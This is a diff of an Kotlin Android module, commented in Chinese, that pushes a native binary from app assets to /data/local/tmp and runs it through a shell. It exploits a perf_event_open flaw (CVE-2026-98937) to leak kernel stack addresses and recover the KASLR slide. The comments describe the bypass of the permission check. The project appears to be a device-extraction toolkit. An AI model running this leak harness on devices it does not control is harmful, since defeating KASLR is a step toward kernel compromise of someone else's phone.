@@ -5,18 +5,21 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 
 /**
- * CVE-2026-98937 泄露自检（源码：woshigenm/CVE-2026-98937 的 PoC 编译而成）。
+ * CVE-2026-98937 泄露自检——**用我们自己的标定器**，不再带第三方 PoC。
  *
- * 这个漏洞本身只给"信息泄露"：perf 的 `exclude_kernel=1` 绕过了内核调用链的权限检查，
- * 于是普通 shell 也能拿到内核栈帧 → 反推 KASLR slide。它**不是**提权原语，
- * 但可以用来交叉验证我们自己的 tracefs 校准结果。
+ * 漏洞本体：`perf_event_open` 只在 `!attr.exclude_kernel` 时才调
+ * `perf_allow_kernel()`；设 `exclude_kernel=1` 同时保留
+ * `PERF_SAMPLE_CALLCHAIN` + `exclude_callchain_kernel=0`，硬件 PMU 在 skid 时
+ * 于内核上下文溢出，`perf_callchain_kernel()` 把内核栈帧写进 ring buffer。
+ * 普通 shell 因此能拿到内核地址 → 反推 KASLR slide。
+ *
+ * 它**不是**提权原语；这里只用来回答「这台机器受不受影响、slide 是多少」。
  */
 object Cve98937Leak {
 
     private const val WORK = "/data/local/tmp/extract-kit"
-    private const val BIN = "$WORK/poc98937"
-    private const val LINK_BASE = -0x3F80000000L   // 0xffffffc080000000（6.6 系 link-time _text）
-    private const val ALIGN = 0x200000L
+    private const val BIN = "$WORK/cve98937-calib"
+    private const val ASSET = "payload/cve-2026-98937-calib"
 
     data class Result(
         val vulnerable: Boolean,
@@ -27,7 +30,7 @@ object Cve98937Leak {
     )
 
     suspend fun deploy(ctx: Context): Boolean = withContext(Dispatchers.IO) {
-        val bytes = runCatching { ctx.assets.open("poc98937").readBytes() }.getOrNull() ?: return@withContext false
+        val bytes = runCatching { ctx.assets.open(ASSET).readBytes() }.getOrNull() ?: return@withContext false
         if (!Shell.connected() && !Shell.connect(ctx)) return@withContext false
         Shell.exec("mkdir -p $WORK")
         val (rc, _) = Shell.pushFile(BIN, bytes, executable = true)
@@ -36,41 +39,21 @@ object Cve98937Leak {
         true
     }
 
-    /** 跑一次 PoC（2 秒左右），解析泄露结果。 */
+    /** 跑一次标定器（约 1.5 秒），把泄露结果解析成结构。 */
     suspend fun run(ctx: Context, textSize: Long = 0x2A00000L): Result = withContext(Dispatchers.IO) {
         if (!Shell.connected() && !Shell.connect(ctx)) {
             return@withContext Result(false, null, 0, null, "shell 未就绪")
         }
-        val (_, out) = Shell.exec("cd $WORK && VULN_FORCE=1 $BIN 2>&1")
-        val vulnerable = out.contains("VULNERABLE")
-        val frames = Regex("""cc_entries=(\d+)""").find(out)?.groupValues?.get(1)?.toIntOrNull() ?: 0
-        val ip = Regex("""first kernel ip: (0x[0-9a-f]+)""").find(out)
-            ?.groupValues?.get(1)?.removePrefix("0x")?.toLongOrNull(16)
-
-        // 用区间求交推 slide：S 必须让所有泄露地址落在 [_text, _text+textSize)
-        var slide: Long? = null
-        if (ip != null && ip > LINK_BASE) {
-            val lo = ip - (LINK_BASE + textSize)   // 下界（不含）
-            val hi = ip - LINK_BASE                // 上界（含）
-            var first: Long = (lo / ALIGN + 1) * ALIGN
-            var last: Long = (hi / ALIGN) * ALIGN
-            if (first <= last && (last - first) / ALIGN <= 64) {
-                slide = first
-            }
-            if (slide == null) slide = null
-            // 用第二个/第三个帧再夹一次（取交集）
-            val more = Regex("""first kernel callchain addresses: ([0-9a-fx ]+)""").find(out)
-                ?.groupValues?.get(1)
-                ?.trim()?.split(" ")?.mapNotNull { it.removePrefix("0x").toLongOrNull(16) } ?: emptyList()
-            for (a in more) {
-                if (a <= LINK_BASE) continue
-                val l = a - (LINK_BASE + textSize)
-                val h = a - LINK_BASE
-                first = maxOf(first, (l / ALIGN + 1) * ALIGN)
-                last = minOf(last, (h / ALIGN) * ALIGN)
-            }
-            if (first <= last) slide = first
-        }
-        Result(vulnerable, ip, frames, slide, out)
+        val (_, out) = Shell.exec("cd $WORK && CVE98937_HOME=/data/local/tmp ./cve98937-calib 2>&1")
+        val frames = Regex("""\[perf\] leak=(\d+)""").find(out)?.groupValues?.get(1)?.toIntOrNull()
+            ?: Regex("""frames=(\d+)""").find(out)?.groupValues?.get(1)?.toIntOrNull()
+            ?: 0
+        val slideHex = Regex("""SLIDE=(0x[0-9a-fA-F]+)""").find(out)?.groupValues?.get(1)
+            ?: Regex("""\[perf\] slide=(0x[0-9a-fA-F]+)""").find(out)?.groupValues?.get(1)
+            ?: Regex("""slide=(0x[0-9a-fA-F]+)""").find(out)?.groupValues?.get(1)
+        val slide = slideHex?.removePrefix("0x")?.toLongOrNull(16)
+        // 命中任何一帧内核地址就说明这台机器可泄露；有 slide 更加确定。
+        val vulnerable = slide != null || frames > 0
+        Result(vulnerable, null, frames, slide, out)
     }
 }
